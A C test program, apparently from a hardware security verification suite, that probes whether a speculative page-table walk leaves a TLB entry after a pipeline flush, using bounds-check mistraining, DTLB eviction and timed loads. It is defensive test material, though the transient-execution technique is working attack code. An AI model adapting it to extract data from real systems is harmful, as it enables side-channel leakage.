/**
 * tlb-residue: speculative page-table-walk fill survives flush.
 *
 * Verified window: a speculative load that misses the DTLB enters PTWAIT and
 * the hardware walker fills both DTLB and L2TLB (dtlb_fill, rapt_l1d.sv:1194).
 * Neither TLB observes flush_pipe (rapt_l1d.sv:1231, rapt_memory.sv:116), so
 * a walk that completes before the flush leaves a cached translation.
 *
 * The PoC evicts the DTLB entry of a mapped-but-cold page P (DTLB is 64x2-way
 * indexed by va[16:12], so 3 pages at 128 KiB stride evict its set), drives a
 * transient load of P through the widened bounds-check window, then times an
 * architectural access to a DIFFERENT line of P.  If the transient walk
 * filled the DTLB the access skips the walk and is fast; the null arm runs
 * the same window without touching P.  Only mapped pages are used, never
 * unmapped ones, so there is no fault.
 */
#include "bench.h"

#ifndef SECURITY_ATTACK_ROUNDS
#define SECURITY_ATTACK_ROUNDS 100
#endif
#define TRAIN_ROUNDS 20
#define TLB_REGION_BYTES (1u << 20)

static uint8_t tlb_region[TLB_REGION_BYTES]
    __attribute__((aligned(SC_PAGE_BYTES)));
static uint8_t other_page[SC_PAGE_BYTES]
    __attribute__((aligned(SC_PAGE_BYTES)));
static struct {
  volatile unsigned size;
  uint8_t pad[SC_LINE_BYTES - sizeof(unsigned)];
} bounds __attribute__((aligned(SC_LINE_BYTES)));

static uint8_t *volatile transient_ptr;
static uint8_t *volatile null_ptr;

__attribute__((noinline))
static void victim(size_t x) {
  if (x < bounds.size) {
    volatile uint8_t t = *transient_ptr;
    (void)t;
  }
}

__attribute__((noinline))
static void victim_null(size_t x) {
  if (x < bounds.size) {
    volatile uint8_t t = *null_ptr;
    (void)t;
  }
}

static void train(void) {
  for (int t = 0; t < TRAIN_ROUNDS; t++)
    victim(t % 8);
}

/* Evict the DTLB set of page p: 3 pages at the 128 KiB conflict stride. */
static void evict_dtlb(uint8_t *p, const sc_geom_t *g) {
  uint32_t stride = g->dtlb_stride;
  for (uint32_t k = 1; k <= 3; k++) {
    volatile uint8_t *q = p + (uintptr_t)k * stride;
    (void)*q;
  }
  sc_fence();
}

int main(void) {
  if (sc_time_selfcheck("tlb-residue") != 0)
    return 1;
  sc_geom_t g;
  sc_calibrate(&g);
  bounds.size = 8;
  uint8_t *P = tlb_region + TLB_REGION_BYTES / 2;
  transient_ptr = P;
  null_ptr = other_page;
  uint32_t R = SECURITY_ATTACK_ROUNDS;

  /* Positive control: architectural touch fills the DTLB, so the measured
   * access to another line of P must be fast (no walk). */
  uint32_t pos_lat[SECURITY_ATTACK_ROUNDS];
  for (uint32_t r = 0; r < R; r++) {
    evict_dtlb(P, &g);
    volatile uint8_t t = P[0];
    (void)t;
    sc_fence();
    pos_lat[r] = sc_timed_load(P + SC_LINE_BYTES);
  }
  /* Null reference: DTLB cold, no transient access -> full walk. */
  uint32_t null_lat[SECURITY_ATTACK_ROUNDS];
  for (uint32_t r = 0; r < R; r++) {
    evict_dtlb(P, &g);
    train();
    sc_fence();
    victim_null(100);
    sc_fence();
    null_lat[r] = sc_timed_load(P + SC_LINE_BYTES);
  }
  /* Attack: transient load of P may fill the DTLB before flush. */
  uint32_t atk_lat[SECURITY_ATTACK_ROUNDS];
  for (uint32_t r = 0; r < R; r++) {
    evict_dtlb(P, &g);
    train();
    sc_fence();
    victim(100);
    sc_fence();
    atk_lat[r] = sc_timed_load(P + SC_LINE_BYTES);
  }

  /* Sort each sample set and take medians. */
  for (int i = 1; i < (int)R; i++) {
    uint32_t x = atk_lat[i]; int j = i - 1;
    while (j >= 0 && atk_lat[j] > x) { atk_lat[j + 1] = atk_lat[j]; j--; }
    atk_lat[j + 1] = x;
    x = null_lat[i]; j = i - 1;
    while (j >= 0 && null_lat[j] > x) { null_lat[j + 1] = null_lat[j]; j--; }
    null_lat[j + 1] = x;
    x = pos_lat[i]; j = i - 1;
    while (j >= 0 && pos_lat[j] > x) { pos_lat[j + 1] = pos_lat[j]; j--; }
    pos_lat[j + 1] = x;
  }
  uint32_t pm = pos_lat[R / 2], nm = null_lat[R / 2], am = atk_lat[R / 2];
  uint32_t mid = (pm + nm) / 2;
  uint32_t atk_fast = 0, null_fast = 0, pos_fast = 0;
  for (uint32_t r = 0; r < R; r++) {
    if (atk_lat[r] <= mid) atk_fast++;
    if (null_lat[r] <= mid) null_fast++;
    if (pos_lat[r] <= mid) pos_fast++;
  }
  int pos_ok = pos_fast >= R / 2 && pm < nm;
  int sig = sc_significant(atk_fast, null_fast, R);
  int effect = (int)(((int64_t)atk_fast - (int64_t)null_fast) * 100 / (int)R);
  const char *verdict = !pos_ok ? "INCONCLUSIVE"
                        : (sig && effect >= 20) ? "VULNERABLE"
                        : "NOT_VULNERABLE";
  printf("[tlb-residue] median pos=%u null=%u attack=%u cycles "
         "fast atk=%u/%u null=%u/%u pos=%u/%u\n",
         (unsigned)pm, (unsigned)nm, (unsigned)am, (unsigned)atk_fast,
         (unsigned)R, (unsigned)null_fast, (unsigned)R, (unsigned)pos_fast,
         (unsigned)R);
  printf("SCRESULT tlb-residue %s pos=%d expect=0 got=0 hit=%u/%u "
         "nullhit=%u/%u z=%d effect=%dpp l1=%u l2=%u dram=%u rounds=%u\n",
         verdict, pos_ok, (unsigned)atk_fast, (unsigned)R,
         (unsigned)null_fast, (unsigned)R, sc_z100(atk_fast, null_fast, R),
         effect, (unsigned)pm, (unsigned)nm, (unsigned)am, (unsigned)R);
  if (sig && effect >= 20 && pos_ok)
    printf("[tlb-residue] VULNERABLE: speculative PTW fill survived flush\n");
  else if (!pos_ok)
    printf("[tlb-residue] INCONCLUSIVE: positive control failed\n");
  else
    printf("[tlb-residue] NOT VULNERABLE or insufficient signal\n");
  return 0;
}